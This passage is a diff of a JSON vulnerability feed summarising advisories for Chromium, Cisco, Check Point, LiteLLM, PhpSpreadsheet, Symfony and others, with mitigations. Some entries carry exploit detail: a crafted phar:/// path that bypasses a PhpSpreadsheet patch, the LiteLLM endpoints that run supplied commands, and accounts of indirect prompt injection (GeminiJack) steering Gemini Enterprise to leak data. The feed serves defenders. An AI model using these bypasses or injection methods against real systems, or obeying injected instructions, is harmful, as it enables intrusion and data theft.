@@ -1,103 +1,10 @@
 {
-  "generated": "2026-06-09T19:56:28.419906+00:00",
-  "total": 31,
-  "kev": 3,
-  "zero_day": 17,
+  "generated": "2026-06-10T02:08:08.453940+00:00",
+  "total": 23,
+  "kev": 0,
+  "zero_day": 18,
   "enriched": 10,
   "findings": [
-    {
-      "id": "CVE-2026-11645",
-      "title": "CVE-2026-11645 \u2014 Google Chromium V8 Out-of-Bounds Read and Write Vulnerability",
-      "summary": "Vendor: Google | Product: Chromium V8. Google Chromium V8 out-of-bounds read and write vulnerability that could allow a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page. This vulnerability could affect multiple web browsers that utilize Chromium, including, but not limited to, Google Chrome, Microsoft Edge, and Opera. Required action: Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable. (due 2026-06-23)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-11645",
-      "published": "2026-06-09",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-11645"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": false,
-      "enrichment": {
-        "technical_details": "Out\u2011of\u2011bounds read and write in V8 allows crafted JavaScript/HTML to corrupt memory, leading to arbitrary code execution inside the renderer sandbox.",
-        "affected_products": "Google Chrome < 149.0.7827.103 (Windows 149.0.7827.102, macOS 149.0.7827.103, Linux 149.0.7827.102); other Chromium\u2011based browsers (Microsoft Edge, Opera) that embed the vulnerable V8 version",
-        "cvss_score": "CVSS score unavailable.",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "true",
-        "patch_available": "true",
-        "active_exploitation": "true",
-        "threat_actors": "None known",
-        "mitigation": "Apply the vendor updates immediately; follow BOD 22-01 guidance for cloud services; if patches cannot be applied, discontinue use or isolate affected systems; limit exposure by blocking untrusted HTML content, using content filters and script\u2011blocking extensions.",
-        "vendor_advisory": "https://chromereleases.googleblog.com/"
-      }
-    },
-    {
-      "id": "CVE-2026-7473",
-      "title": "CVE-2026-7473 \u2014 Arista Extensible Operating System Incomplete Comparison with Missing Factors Vulnerability",
-      "summary": "Vendor: Arista | Product: Extensible Operating System. Arista Extensible Operating System (EOS) contains an incomplete comparison with missing factors vulnerability when the switch incorrectly decapsulate and forwards other unexpected tunneled packet with a destination IP matching its configured decapsulation IP. Required action: Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable. (due 2026-06-23)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-7473",
-      "published": "2026-06-09",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-7473"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": false,
-      "enrichment": {
-        "technical_details": "When an Arista EOS device is configured as a tunnel endpoint (VXLAN VTEP, GRE endpoint, or IP decap group), it may decapsulate packets whose destination IP matches the configured decap IP without verifying the tunnel protocol type, causing unexpected decapsulation and forwarding of non\u2011configured tunnel traffic.",
-        "affected_products": "Arista EOS 4.36.x, 4.35.x, 4.34.x, 4.33.x, 4.32.x, 4.31.x, 4.30.x, trains older than 4.30.x, trains newer than 4.36.x; platforms 7020R, 7280R/R2, 7500R/R2 (limited exposure on 7280R3, 7500R3, 7800R3)",
-        "cvss_score": "5.8",
-        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N",
-        "exploit_available": "false",
-        "patch_available": "false",
-        "active_exploitation": "true",
-        "threat_actors": "None known",
-        "mitigation": "Apply ACLs on upstream devices or on the decapsulation switch to restrict tunnel types/ports/IPs (examples for VXLAN, GRE, GUE, IP\u2011in\u2011IP using IP/MAC ACLs and UDF\u2011based MAC ACLs). Follow BOD\u202f22\u201101 guidance for cloud services; discontinue use if mitigations are unavailable.",
-        "vendor_advisory": "https://www.arista.com/en/support/advisories-notices/security-advisory/24005-security-advisory-0137"
-      }
-    },
-    {
-      "id": "CVE-2026-20245",
-      "title": "CVE-2026-20245 \u2014 Cisco Catalyst SD-WAN Manager Improper Encoding or Escaping of Output Vulnerability",
-      "summary": "Vendor: Cisco | Product: Catalyst SD-WAN Manager. Cisco Catalyst SD-WAN Manager formerly SD-WAN vManage contains an improper encoding or escaping of output vulnerability. This vulnerability could allow an authenticated, local attacker to execute arbitrary commands as root by supplying a crafted file to the affected system. Required action: Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable. (due 2026-06-23)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-20245",
-      "published": "2026-06-09",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-20245"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": false,
-      "enrichment": {
-        "technical_details": "Improper encoding/escaping of CLI output allows an authenticated, local attacker to inject crafted input that is executed as a root command, resulting in privilege escalation.",
-        "affected_products": "Cisco Catalyst SD-WAN Manager (formerly SD-WAN vManage)",
-        "cvss_score": "CVSS score unavailable.",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "Exploit availability unknown.",
-        "patch_available": "false",
-        "active_exploitation": "true",
-        "threat_actors": "Threat actors unknown.",
-        "mitigation": "Apply mitigations per Cisco's advisory, follow BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
-        "vendor_advisory": "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx"
-      }
-    },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a",
       "title": "Ransomware Actors Exploit Unpatched SimpleHelp Remote Monitoring and Management to Compromise Utility Billing Software Provider",
@@ -115,16 +22,48 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "CVE-2024-57727 is a path\u2011traversal (directory traversal) vulnerability in SimpleHelp 5.5.7 and earlier that lets an unauthenticated remote attacker craft requests to traverse directories and read arbitrary files (e.g., logs, configuration files, credentials) from the server.",
-        "affected_products": "SimpleHelp Remote Support / Remote Monitoring and Management (RMM) \u2014 versions 5.5.7 and earlier",
+        "technical_details": "The vulnerability is a directory traversal flaw that enables unauthenticated remote attackers to read sensitive files on the affected system via crafted file paths.",
+        "affected_products": "SimpleHelp remote support software v5.5.7 and earlier",
         "cvss_score": "7.5",
-        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "Exploit availability unknown.",
+        "patch_available": "Patch availability unknown.",
+        "active_exploitation": "true",
+        "threat_actors": "Ransomware actors",
+        "mitigation": "Mitigation steps unavailable.",
+        "vendor_advisory": "http://broadcom.com/support/security-center/protection-bulletin/cve-2024-57727-simplehelp-directory-traversal-vulnerability"
+      }
+    },
+    {
+      "id": "https://www.rapid7.com/blog/post/em-patch-tuesday-june-2026",
+      "title": "Patch Tuesday - June 2026",
+      "summary": "Microsoft is publishing 200 vulnerabilities on June 2026 Patch Tuesday . Microsoft is not aware of exploitation in the wild for any of these vulnerabilities, and is aware of public disclosure for three. This is similar to last month\u2019s Patch Tuesday, however several of last month\u2019s vulnerabilities ended up on CISA KEV in the days following their publication. So far this month, Microsoft has provided patches to address 360 browser vulnerabilities, which is an order of magnitude more than has been typical in any given month over the past few years. As usual, browser vulns are not included in the Patch Tuesday count above. Indeed, the vast, and presumably sustained, uptick in the number of browser vulnerabilities has led to Microsoft no longer enumerating Chromium CVEs in the Security Update Guide. Other vulnerability categories, especially Linux kernel vulnerabilities, are seeing a similar increase in AI-assisted vulnerability reports. What's the opposite of coordinated disclosure? In recent weeks, an independent vulnerability researcher going by the pseudonym Nightmare Eclipse has attracted significant attention by publishing details of six Microsoft vulnerabilities, including elevation of privilege vulnerabilities in Defender, and a Secure Boot disk encryption bypass. The researcher provided full proof-of-concept code for some, and provided significant-but-incomplete detail around the path to exploitation for others. Microsoft has confirmed that these disclosures were not coordinated, and it is clear that the relationship between this researcher and Microsoft is less than cordial. Two of the disclosures emerged in the hours after last month\u2019s Patch Tuesday, which provides maximum visibility, while limiting Microsoft\u2019s ability to respond without out-of-cycle patches. At time of writing, Microsoft has provided mitigation advice and patches for CVE-2026-33825 , CVE-2026-45585 , CVE-2026-45498 , and CVE-2026-41091 , leaving only two elevation of privilege vulnerabilities",
+      "link": "https://www.rapid7.com/blog/post/em-patch-tuesday-june-2026",
+      "published": "2026-06-09T21:04:53+00:00",
+      "source": "Rapid7 Blog",
+      "tags": [
+        "research",
+        "metasploit"
+      ],
+      "cve_ids": [
+        "CVE-2026-33825",
+        "CVE-2026-45585",
+        "CVE-2026-45498",
+        "CVE-2026-41091"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": true,
+      "enrichment": {
+        "technical_details": "Local elevation of privilege due to insufficient granularity of access control in Microsoft Defender. Exploit chains Defender update workflow, Volume Shadow Copy, Cloud Files API, opportunistic locks and symbolic links to access SAM and escalate to NT AUTHORITY\\SYSTEM.",
+        "affected_products": "Microsoft Defender (Defender Antimalware Platform \u2014 version 4.18.26050.3011)",
+        "cvss_score": "7.8",
+        "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
         "exploit_available": "true",
         "patch_available": "true",
-        "active_exploitation": "true",
-        "threat_actors": "Ransomware actors (including groups linked to DragonForce and other ransomware operators)",
-        "mitigation": "Immediately upgrade SimpleHelp to version 5.5.8 or later; if patching is delayed, restrict network access to the SimpleHelp server (block inbound access from untrusted networks, apply firewall rules, use network segmentation), rotate credentials and secrets found on compromised instances, review logs for suspicious access, and follow CISA/vendor incident\u2011response guidance.",
-        "vendor_advisory": "https://www.simple-help.com/blogs/security-vulnerabilities-in-simplehelp-5-5-7-and-earlier-what-you-need-to-know"
+        "active_exploitation": "false",
+        "threat_actors": "None known",
+        "mitigation": "Apply Microsoft security update for CVE-2026-33825; restrict local logon rights; use application control to block execution from writable directories; monitor Defender service activity for anomalies.",
+        "vendor_advisory": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33825"
       }
     },
     {
@@ -148,16 +87,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Denial\u2011of\u2011service vulnerability in HTTP.sys where specially crafted HTTP/2 requests with a large number of headers trigger resource exhaustion in the HTTP/2/HTTP/3 stack, causing service disruption.",
-        "affected_products": "Windows HTTP.sys",
+        "technical_details": "Denial-of-service vulnerability in HTTP.sys allowing specially crafted requests to crash or hang the HTTP server/stack, leading to service disruption",
+        "affected_products": "Microsoft Windows HTTP.sys (Windows HTTP stack; affects systems using HTTP.sys)",
         "cvss_score": "7.5",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "true",
-        "patch_available": "true",
-        "active_exploitation": "false",
+        "cvss_vector": "CVSS vector unavailable",
+        "exploit_available": "false",
+        "patch_available": "true \u2014 https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-49160",
+        "active_exploitation": "true \u2014 https://krebsonsecurity.com/2026/06/a-record-breaking-patch-tuesday-for-june-2026/; https://www.tenable.com/blog/microsofts-june-2026-patch-tuesday-addresses-198-cves-cve-2026-49160-cve-2026-50507",
         "threat_actors": "None known",
-        "mitigation": "Apply the June\u202f2026 Microsoft updates. As a temporary measure, configure the MaxHeadersCount registry setting to limit the number of headers in HTTP/2 and HTTP/3 requests and consider rate\u2011limiting suspicious HTTP/2 traffic.",
-        "vendor_advisory": "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2026-49160"
+        "mitigation": "Apply vendor patch immediately; if patching delayed, mitigate by restricting inbound HTTP(S) traffic (block unwanted sources at network edge), deploy WAF rules to drop malicious requests, and monitor HTTP.sys/service restarts",
+        "vendor_advisory": "https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-49160"
       }
     },
     {
@@ -175,16 +114,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Technical details unavailable.",
-        "affected_products": "Affected products unavailable.",
-        "cvss_score": "CVSS score unavailable.",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "true - https://www.bleepingcomputer.com/news/microsoft/microsoft-june-2026-patch-tuesday-fixes-3-zero-day-200-flaws/",
-        "patch_available": "true - https://msrc.microsoft.com/update-guide/",
-        "active_exploitation": "true - https://www.bleepingcomputer.com/news/microsoft/microsoft-june-2026-patch-tuesday-fixes-3-zero-day-200-flaws/",
+        "technical_details": "CVE-2026-45586 \u2013 improper link resolution before file access in Windows CTFMON (\\\"link following\\\") lets a locally authenticated attacker elevate to SYSTEM. CVE-2026-49160 \u2013 uncontrolled resource consumption in HTTP/2 header compression/flow\u2011control enables a remote denial\u2011of\u2011service (the \\\"HTTP/2 Bomb\\\"). CVE-2026-50507 \u2013 BitLocker protection can be bypassed by placing specially crafted files on USB/EFI and booting into WinRE, triggering a shell (YellowKey) that grants access to encrypted drives on TPM\u2011only configurations.",
+        "affected_products": "Windows Collaborative Translation Framework (CTFMON) on supported Windows versions, Windows HTTP.sys (HTTP/2) on Windows clients and servers handling HTTP/2/HTTP/3, Windows BitLocker on affected Windows 11 and Windows Server 2022/2025 systems using TPM-only BitLocker",
+        "cvss_score": "CVSS score unavailable",
+        "cvss_vector": "CVSS vector unavailable",
+        "exploit_available": "true",
+        "patch_available": "true",
+        "active_exploitation": "false",
         "threat_actors": "None known",
-        "mitigation": "Apply Microsoft June 2026 updates immediately; follow vendor guidance.",
-        "vendor_advisory": "https://msrc.microsoft.com/update-guide/"
+        "mitigation": "Apply Microsoft patches immediately. For HTTP/2 Bomb use Microsoft\u2019s MaxHeadersCount registry setting (see KB5102602). For BitLocker, enable TPM+PIN rather than TPM\u2011only until patched. No additional workaround for CTFMON beyond patching.",
+        "vendor_advisory": "https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-45586, https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-49160, http://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-50507"
       }
     },
     {
@@ -202,16 +141,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Authentication\u2011bypass logic flaw in IKEv1 VPN handling that allows remote unauthenticated attackers to bypass user authentication and establish VPN connections without valid credentials.",
-        "affected_products": "Check Point Remote Access VPN, Check Point Mobile Access; Security Gateways R82.10 Jumbo Hotfix Take 19",
-        "cvss_score": "9.3",
-        "cvss_vector": "CVSS vector unavailable",
-        "exploit_available": "false",
+        "technical_details": "Authentication-bypass logic-flow weakness in Remote Access and Mobile Access certificate validation when using deprecated IKEv1 key exchange; allows unauthenticated remote attackers to bypass user authentication and establish a remote access VPN connection without a valid user password.",
+        "affected_products": "Check Point Mobile Access / SSL VPN, Remote Access VPN, Spark Firewalls \u2013 versions: R82.10 Jumbo Hotfix Take 19 or below; R82 Jumbo Hotfix Take 103 or below; R81.20 Jumbo Hotfix Take 141 or below; R81.10 (EOS); R81 (EOS); R80.40 (EOS); Spark: R80.20.X (EOS), R81.10.X, R82.00.X",
+        "cvss_score": "CVSS score unavailable.",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "true",
         "patch_available": "true",
         "active_exploitation": "true",
-        "threat_actors": "Qilin ransomware affiliate",
-        "mitigation": "Apply Check Point hotfixes/patches per vendor advisory; if immediate patching not possible, disable/decommission deprecated IKEv1 VPN services where feasible and restrict access to management interfaces; follow vendor hardening guidance in SK185033.",
-        "vendor_advisory": "https://blog.checkpoint.com/security/check-point-releases-important-hotfix-for-vulnerabilities-in-deprecated-ikev1-vpn-protocol/"
+        "threat_actors": "Qilin ransomware (Qilin RaaS affiliate) \u2013 one confirmed post-compromise case; broader actor infrastructure observed (Qilin affiliate)",
+        "mitigation": "If unable to patch, remove support for legacy remote access clients; configure Remote Access VPN Authentication to IKEv2 only; set Machine Certificate Authentication to mandatory; enable IPS and download signatures; follow SmartConsole log hunts and IOCs provided by Check Point.",
+        "vendor_advisory": "https://support.checkpoint.com/results/sk/sk185033"
       }
     },
     {
@@ -231,46 +170,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Command injection vulnerability in LiteLLM's MCP/server test endpoints that permits execution of arbitrary commands by an authenticated user; chaining with CVE\u20112026\u201148710 enables unauthenticated remote code execution against vulnerable deployments.",
-        "affected_products": "LiteLLM (BerriAI) proxy server versions >= 1.74.2 and < 1.83.7",
+        "technical_details": "Two MCP preview endpoints (POST /mcp-rest/test/connection and POST /mcp-rest/test/tools/list) accepted stdio configs (command, args, env) and spawned the supplied command as a subprocess on the proxy host; the endpoints required only a valid proxy API key and lacked role checks, allowing any authenticated user to execute arbitrary commands. When chained with CVE-2026-48710 (Starlette BadHost host\u2011header bypass), the attack can become unauthenticated remote code execution.",
+        "affected_products": "LiteLLM (BerriAI) versions >= 1.74.2 and < 1.83.7",
         "cvss_score": "8.7",
-        "cvss_vector": "CVSS vector unavailable",
-        "exploit_available": "Exploit availability unknown",
-        "patch_available": "true \u2014 https://github.com/BerriAI/litellm/releases",
-        "active_exploitation": "true \u2014 https://thehackernews.com/2026/06/litellm-flaw-cve-2026-42271-exploited.html",
+        "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:N/SA:N",
+        "exploit_available": "true",
+        "patch_available": "true",
+        "active_exploitation": "true",
         "threat_actors": "None known",
-        "mitigation": "Upgrade to patched release (>= 1.83.7). If patch cannot be applied immediately, restrict access to LiteLLM management/MCP endpoints (network ACLs, firewall rules), require/verify authentication, isolate deployments, and monitor for anomalous process execution and suspicious outbound connections.",
-        "vendor_advisory": "https://github.com/BerriAI/litellm/releases"
-      }
-    },
-    {
-      "id": "CVE-2026-45034",
-      "title": "PHPSpreadsheet has a patch bypass for CVE-2026-34084 ",
-      "summary": "## Summary\n\nCVE-2026-34084 was patched by the helper `File::prohibitWrappers`. The helper calls `parse_url($filename, PHP_URL_SCHEME)` and then checks `is_string($scheme) && strlen($scheme) > 1` to reject stream wrappers such as `phar://`, `php://`, `data://` or `expect://`. The check is not equivalent to \"does the path contain a wrapper\". When the input has the form `phar:///path/file.phar/inner` with three or more slashes after the scheme, `parse_url` returns boolean `false` instead of returning the scheme string. The `is_string($scheme)` branch is therefore skipped, the helper returns without throwing, and the caller proceeds. PHP's stream layer, however, still treats `phar:///...` as a valid phar wrapper and opens the underlying phar file. The result is that `IOFactory::load($attackerPath)` walks past the patch and still touches the phar wrapper. On PHP 7.x, simply reaching the phar wrapper via `is_file` is enough for PHP to automatically deserialize the phar metadata, which in turn invokes the magic methods `__wakeup` and `__destruct` of an attacker controlled object and gives full RCE. On PHP 8.x, automatic metadata deserialization for plain file ops was removed, so the chain at the PhpSpreadsheet layer reduces to a phar wrapper file read primitive, and RCE only resurfaces if the downstream consumer ever calls `Phar::getMetadata`.\n\n## Vulnerable code\n\nThe file `vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Shared/File.php` is byte identical across all six latest tags listed below:\n\n```php\npublic static function prohibitWrappers(string $filename): void\n{\n    $scheme = parse_url($filename, PHP_URL_SCHEME);\n    if (is_string($scheme) && strlen($scheme) > 1) {\n        throw new Exception(\"Stream wrappers are not permitted as file paths: {$filename}\");\n    }\n}\n```\n\nFor input `phar://x/dummy.csv` the call returns the string `\"phar\"` and the throw fires correctly. For input `phar:///work/exploit.phar/dummy.csv` the same call returns `false` and the throw is skip",
-      "link": "https://github.com/advisories/GHSA-87m4-826x-3crx",
-      "published": "2026-06-08T23:00:14Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-45034"
-      ],
-      "is_zero_day": true,
-      "is_high_severity": true,
-      "enrichment": {
-        "technical_details": "A fix for CVE-2026-34084 added File::prohibitWrappers which calls parse_url($filename, PHP_URL_SCHEME) and rejects a scheme only when is_string($scheme) && strlen($scheme) > 1. If a filename uses the form phar:///path/file.phar/inner (three or more slashes), parse_url returns boolean false for the scheme, causing the is_string check to be skipped and the helper to fail to detect the phar stream wrapper, allowing the earlier vulnerability to be bypassed.",
-        "affected_products": "PHPOffice/PhpSpreadsheet versions 1.30.2 and earlier, 2.0.0 through 2.1.14",
-        "cvss_score": "CVSS score unavailable",
-        "cvss_vector": "CVSS vector unavailable",
-        "exploit_available": "false",
-        "patch_available": "true \u2014 http://github.com/advisories/GHSA-87m4-826x-3crx",
-        "active_exploitation": "Active exploitation status unknown",
-        "threat_actors": "None known",
-        "mitigation": "Sanitize and validate filenames by explicitly detecting wrappers (e.g., check for known wrapper prefixes like \"phar://\", \"php://\", \"data://\", or use a more robust parse that treats multiple slashes), upgrade when an official patch is available, and avoid loading untrusted filenames. If immediate mitigation required, add a custom check for substrings matching \"://\" or use a stricter whitelist of allowed file path patterns.",
-        "vendor_advisory": "http://github.com/advisories/GHSA-87m4-826x-3crx"
+        "mitigation": "Upgrade to LiteLLM v1.83.7 and Starlette \u2265 1.0.1. If patching is not possible, block the two POST /mcp\u2011rest/test endpoints at the perimeter, restrict network access to the proxy, rotate stored credentials, and monitor logs for host\u2011header anomalies and unexpected subprocess execution.",
+        "vendor_advisory": "https://github.com/BerriAI/litellm/security/advisories/GHSA-v4p8-mg3p-g94g"
       }
     },
     {
@@ -289,16 +198,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect Prompt Injection (IPI) occurs when adversarial content seeded on web pages or external content sources influences AI agents that browse or ingest that content, causing them to follow malicious instructions or leak sensitive data. Attack vector: poisoned web content or third\u2011party sources referenced by AI agents\u2019 browsing/RAG pipelines.",
-        "affected_products": "Affected products unavailable",
-        "cvss_score": "CVSS score unavailable",
-        "cvss_vector": "CVSS vector unavailable",
-        "exploit_available": "true",
-        "patch_available": "false",
+        "technical_details": "Indirect Prompt Injection (IPI) occurs when untrusted external content retrieved by a system (e.g., web pages, scraped corpora, or retrieved documents in RAG) contains instructions crafted to influence a downstream LLM or agent. Attackers seed malicious prompts in external content; when the system retrieves that content and includes it in prompts or agent observations, the model follows the injected instructions, enabling data exfiltration, chain\u2011of\u2011command override, or other undesired behaviors. GeminiJack is a zero\u2011click instance where injected content caused Google Gemini Enterprise to act on malicious instructions without user interaction.",
+        "affected_products": "Google Gemini Enterprise",
+        "cvss_score": "CVSS score unavailable.",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "true \u2013 https://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability/",
+        "patch_available": "Patch availability unknown.",
         "active_exploitation": "true",
         "threat_actors": "None known",
-        "mitigation": "Apply defense\u2011in\u2011depth: validate and sanitize external content before use; apply source reputation and allowlists; use prompt\u2011layering and instruction\u2011sanitization techniques; limit agent permissions and data exfiltration capabilities; monitor telemetry for anomalous model outputs; keep models and retrieval pipelines updated. (Mitigations summarized from Google Security Blog guidance.)",
-        "vendor_advisory": "http://security.googleblog.com/2026/04/ai-threats-in-wild-current-state-of.html"
+        "mitigation": "Blocklist or filter retrieval sources; validate and sanitize retrieved content before including in prompts; apply prompt compartmentalization and instruction\u2011hiding techniques; use strict provenance/trust scoring for retrieved documents; limit model capabilities for automatically\u2011executed actions; apply rate\u2011limiting and anomaly detection on agent actions. Follow vendor guidance in the Google Security Blog advisory.",
+        "vendor_advisory": "https://blog.google/security/prompt-injections-web/"
       }
     },
     {
@@ -315,7 +224,19 @@
       ],
       "cve_ids": [],
       "is_zero_day": true,
-      "is_high_severity": true
+      "is_high_severity": true,
+      "enrichment": {
+        "technical_details": "Indirect prompt injection (IPI) is an attack where adversarial instructions are injected into data sources or tools (emails, documents, web content, calendar invites, connectors) that an LLM\u2011powered system ingests while fulfilling a user\u2019s request; these injected instructions can influence the model\u2019s behavior (including exfiltration or action execution) without direct user input. GeminiJack was a zero\u2011click IPI chain targeting Gemini Enterprise via crafted email/invite/document content.",
+        "affected_products": "Google Workspace (Workspace apps using Gemini / Gemini Enterprise integrations)",
+        "cvss_score": "CVSS score unavailable",
+        "cvss_vector": "CVSS vector unavailable",
+        "exploit_available": "false",
+        "patch_available": "true",
+        "active_exploitation": "true",
+        "threat_actors": "None known",
+        "mitigation": "Apply Google Workspace mitigations and layered defenses: content sanitization and filtering, strict context/trust boundaries, provenance and source validation, least\u2011privilege agent permissions, rate limits and monitoring, disable or harden automation/agentic actions for untrusted inputs, apply vendor configuration guidance in blog advisory.",
+        "vendor_advisory": "http://blog.google/security/google-workspaces-continuous-approach-to-mitigating-indirect-prompt-injections"
+      }
     },
     {
       "id": "tag:blogger.com,1999:blog-1176949257541686127.post-5444043768676554819",
@@ -331,7 +252,19 @@
       ],
       "cve_ids": [],
       "is_zero_day": true,
-      "is_high_severity": true
+      "is_high_severity": true,
+      "enrichment": {
+        "technical_details": "Indirect prompt injection (IPI) occurs when untrusted web content manipulates an agentic model's prompts via intermediary content or UI flows, enabling zero\u2011click command execution; Noma Labs demonstrated an IPI that caused Gemini Enterprise to execute injected instructions without user interaction.",
+        "affected_products": "Chrome (agentic browsing / Gemini integration), Google Gemini Enterprise",
+        "cvss_score": "CVSS score unavailable.",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "true",
+        "patch_available": "true",
+        "active_exploitation": "false",
+        "threat_actors": "None known",
+        "mitigation": "Google recommended architectural guardrails for agentic browsing (sandboxing agentic actions, strict input/output validation, provenance tracking, user transparency and control), and rolled out new Chrome security layers for agentic features. Users should keep Chrome updated and disable agentic/AI features until patched.",
+        "vendor_advisory": "http://blog.google/security/architecting-security-for-agentic"
+      }
     },
     {
       "id": "tag:blogger.com,1999:blog-1176949257541686127.post-8619085627823664385",
@@ -347,7 +280,19 @@
       ],
       "cve_ids": [],
       "is_zero_day": true,
-      "is_high_severity": true
+      "is_high_severity": true,
+      "enrichment": {
+        "technical_details": "A linear buffer overflow (bounds\u2011checking error) was discovered in CrabbyAVIF (an AVIF parser/decoder implemented in unsafe Rust) that could have led to remote code execution; the flaw was caught before a public release and tracked as CVE\u20112025\u201148530.",
+        "affected_products": "Affected products unavailable.",
+        "cvss_score": "8.1",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "false",
+        "patch_available": "true (https://android.googlesource.com/platform/external/rust/crabbyavif/+/5262cd9befecb4f8865925c23eb543f19967e050)",
+        "active_exploitation": "false",
+        "threat_actors": "None known",
+        "mitigation": "Apply the vendor patch linked above; audit and minimize unsafe Rust usage, add bounds checks, improve fuzzing and code review for unsafe blocks; ensure up-to-date Android security patch level.",
+        "vendor_advisory": "https://source.android.com/docs/security/bulletin/2025-08-01"
+      }
     },
     {
       "id": "tag:blogger.com,1999:blog-1176949257541686127.post-1436003009998740920",
@@ -392,6 +337,39 @@
         "ics"
       ],
       "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-rogueplanet-zero-day-grants-system-privileges/",
+      "title": "Microsoft Defender 'RoguePlanet' zero-day grants SYSTEM privileges",
+      "summary": "[...]",
+      "link": "https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-rogueplanet-zero-day-grants-system-privileges/",
+      "published": "2026-06-09T23:11:18+00:00",
+      "source": "Bleeping Computer",
+      "tags": [
+        "news",
+        "malware"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-47767",
+      "title": "SymfonyRuntime CVE-2024-50340 Patch Bypass: Web Requests Can Still Set APP_ENV/APP_DEBUG via parse_str/SAPI Argv Mismatch",
+      "summary": "### Description\n\nCVE-2024-50340 (GHSA-x8vp-gf4q-mw5j) addressed an issue where, with `register_argc_argv=On`, a crafted query string let an unauthenticated GET change the kernel environment and debug flag by feeding `--env`/`--no-debug` through `$_SERVER['argv']`. The fix shipped in `symfony/runtime` 5.4.46 / 6.4.14 / 7.1.7 gated the argv read on `empty($_GET)` as a proxy for \"is this a CLI invocation\".\n\nThat proxy is unsafe: `parse_str()` (which builds `$_GET`) and the web SAPI (which builds `$_SERVER['argv']` from the raw query when `register_argc_argv=On`) do not agree on every input, so an attacker can craft a query that leaves `$_GET` empty while `$_SERVER['argv']` carries the attacker's flags. `SymfonyRuntime::getInput()` then parses them, restoring the exact primitive CVE-2024-50340 was meant to prevent.\n\nPreconditions and impact match the original CVE: web SAPI, `register_argc_argv=On`, app booted through `symfony/runtime`; from an unauthenticated GET an attacker can flip `APP_ENV` and toggle `APP_DEBUG`.\n\n### Resolution\n\n`SymfonyRuntime` now gates the argv read on `isset($_SERVER['QUERY_STRING'])` rather than on `empty($_GET)`. `QUERY_STRING` is the same input the SAPI uses to build argv, so the security check and the thing it protects no longer parse different sources. Worker SAPIs (FrankenPHP / RoadRunner / Swoole) keep working because the runtime constructor runs once at boot when `QUERY_STRING` is unset.\n\nThe patch for this issue is available [here](https://github.com/symfony/symfony/commit/3228c3806ee511008bea19a95084d460b17e5d25) for branch 5.4.\n\n### Credits\n\nSymfonyRuntime would like to thank 0xEr3n for reporting the issue and Nicolas Grekas for providing the fix.",
+      "link": "https://github.com/advisories/GHSA-fqc7-9xjw-jrh3",
+      "published": "2026-06-09T21:58:11Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
